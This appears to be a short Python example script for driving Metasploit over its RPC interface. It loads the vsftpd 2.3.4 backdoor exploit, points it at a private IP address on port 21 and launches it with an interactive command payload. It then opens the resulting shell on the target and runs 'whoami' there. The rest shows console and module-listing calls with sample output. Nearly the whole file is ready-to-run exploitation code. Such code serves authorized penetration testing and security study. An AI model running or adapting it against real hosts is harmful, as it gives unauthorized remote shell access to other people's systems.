import os
from metasploit.msfrpc import *

## Brief example script

# Connect to the RPC server
client = MsfRpcClient('mypassword')

# Get an exploit object
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

# Set the exploit options
exploit['RHOST'] = "192.168.115.80"
exploit['RPORT'] = "21"

# Execute the exploit, success will return a jobid
exploit.execute(payload="cmd/unix/interact")

# Find all available sessions
print("Sessions avaiables : ")
for s in client.sessions.list.keys():
	print(s)

# Get a shell object
shell = client.sessions.session(list(client.sessions.list.keys())[0])

# Write to the shell
shell.write('whoami\n')

# Print the output
print(shell.read())

# Stop the shell
shell.stop()



## Console

# Create a console and get the new console ID
client.consoles.console().cid
# >>> "1"

# Write to console
client.consoles.console('0').write('show options')

# Read from console
client.consoles.console('0').read()
# >>> {'data': 'Global Options:\n===============\n\n   Option...'
#      'prompt': '\x01\x02msf5\x01\x02 \x01\x02> ',
#      'busy': False}

# Check if console is busy
client.consoles.console('0').is_busy()
# >>> False


## Modules

# List exploit modules
client.modules.exploits
# >>> ['aix/local/ibstat_path',
#      'aix/rpc_cmsd_opcode21',
#      'aix/rpc_ttdbserverd_realpath',
#       ...]

# Use a module
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

# Set module options
exploit['RHOST'] = "192.168.115.80"
exploit['RPORT'] = "21"

# Get required options
exploit.required
# >>> ['RHOSTS', 'RPORT', 'SSLVersion', 'ConnectTimeout']

# Get required options that haven't been set yet
exploit.missing_required
# >>> ['RHOSTS']

# See all the options which have been set
exploit.runoptions
# >>> {'VERBOSE': False,
#      'WfsDelay': 0,
#      'EnableContextEncoding': False,
#      'DisablePayloadHandler': False,
#      'RPORT': 21,
#      'SSL': False,
#      'SSLVersion': 'Auto',
#      'SSLVerifyMode': 'PEER',
#      'ConnectTimeout': 10,
#      'TCP::max_send_size': 0,
#      'TCP::send_delay': 0}



